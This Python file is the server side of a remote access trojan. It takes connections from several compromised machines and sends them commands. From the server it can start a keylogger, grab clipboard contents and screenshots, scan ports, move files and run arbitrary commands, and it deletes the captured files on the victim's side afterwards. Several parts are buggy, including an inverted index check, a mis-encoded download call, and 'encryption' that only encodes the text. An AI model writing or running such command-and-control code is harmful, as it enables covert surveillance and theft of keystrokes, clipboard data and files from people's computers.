import os
import socket
import threading


def log(message):
    print(f'[INFO] {message}')

class MultiConnectionServer:
    def __init__(self):
        self.s = socket.socket()
        self.__commands = {
            "select": self.select_client,
            "list": self.list_connected_clients,
            "help": self.get_commands,
            "download": self.download,
            "upload": self.upload,
            "start-keylogger": self.start_keylogger,
            "end-keylogger": self.end_keylogger,
            "extract-clipboard": self.extract_clipboard,
            "get-screenshot": self.get_screenshots,
            "get-ports": self.get_ports
        }
        self.__clients = list()
        self.__sc = None

    def start_server(self, port):
        self.s.bind(("0.0.0.0", port))
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        threading.Thread(target=self.master_listener).start()
        threading.Thread(target=self.master_handler).start()

    def get_commands(self):
        description = [
            'selects client',
            'lists all connected clients',
            'lists available commands',
            'downloads a file (client) from a specified directory by server',
            'uploads a file (client) to the specified directory of client',
            'starts keylogger in client machine',
            'ends keylogger execution and downloads output.txt from client machine',
            'extract clipboard from client machine',
            'takes screenshot on client machine',
            'scans available ports on client machine'
        ]
        for c, d in zip(self.__commands.keys(), description):
            print(f'{c}: {d}')

    def select_client(self, idx):
        idx = int(idx)
        if idx > len(self.__clients) or idx >= 0:
            self.__sc = self.__clients[idx][0]
            log('client successfully selected')
        else:
            log('there is no such client')

    def master_listener(self):
        self.s.listen(10)
        while True:
            c, addr = self.s.accept()
            self.__clients.append((c, addr[0], addr[1]))
            log(f'We got a connection from {addr[0]}:{addr[1]}')
            if self.__sc == None:
                self.__sc = c

    def master_handler(self):
        print('--Welcome to server!--')
        while True:
            command = input('> ')
            c = command.split()[0]
            if c in self.__commands.keys():
                if c == 'download' or c == 'select':
                    self.__commands[c](command)
                else:
                    self.__commands[c]()
            else:
                self.__sc.send(command.encode())
                print(self.decrypt(self.__sc.recv(2048)))

    def list_connected_clients(self):
        if not len(self.__clients):
            log('there are no clients connected to server')
            return
        for idx, client in enumerate(self.__clients):
            log(f'{idx}: {client[1]}:{client[2]}')

    def upload(self, path):
        filename = path.split()[-1]
        with open(path, 'r') as f:
            self.__sc.send(self.encrypt(f'upload${filename}${f.read()}'))

    def start_keylogger(self):
        if not self.__sc:
            log('client is not selected')
        self.__sc.send(self.encrypt('start-keylogger'))
        log(self.decrypt(self.__sc.recv(2048)))

    def end_keylogger(self):
        self.download(self.encrypt('download keylogger.txt'))
        self.__sc.send(self.encrypt('end-keylogger'))
        log(self.decrypt(self.__sc.recv(2048)))
        self.__sc.send(self.encrypt('delete keylogger.txt'))
        log(self.decrypt(self.__sc.recv(2048)))

    def extract_clipboard(self):
        self.download(self.encrypt('download clipboard.txt'))
        self.__sc.send(self.encrypt('delete clipboard.txt'))
        log(self.decrypt(self.__sc.recv(2048)))

    def get_screenshots(self):
        self.download(self.encrypt('download screenshot.bmp'))
        self.__sc.send(self.encrypt('delete screenshot.bmp'))
        log(self.decrypt(self.__sc.recv(2048)))


    def get_ports(self):
        self.__sc.send(self.encrypt('get-ports'))
        while True:
            packet = self.__sc.recv(2048)
            if packet.endswith('DONE'.encode()):
                log('port scanning has finished')
                if len(packet[:-4]) > 0:
                    log(self.decrypt(packet[:-4]))
                else:
                    log('unfortunatly, none found')
                break

    def download(self, command):
        if not self.__sc:
            log('client is not selected')
            return
        c, path = command.split()
        self.__sc.send(self.encrypt(f'{c}${path}'))
        with open(path, 'wb+') as f:
            while True:
                packet = self.__sc.recv(2048)
                if packet.endswith('DONE'.encode()):
                    f.write(packet[:-4])
                    f.close()
                    log('file successfully downloaded')
                    break
                if 'File not found'.encode() in packet:
                    log('unable to find the file')
                    break
                f.write(packet)

    def encrypt(self, data):
        return data.encode()

    def decrypt(self, data):
        return data.decode()

    def shutdown(self):
        self.s.close()
        os._exit()

if __name__ == '__main__':
    server = MultiConnectionServer()
    server.start_server(9001)

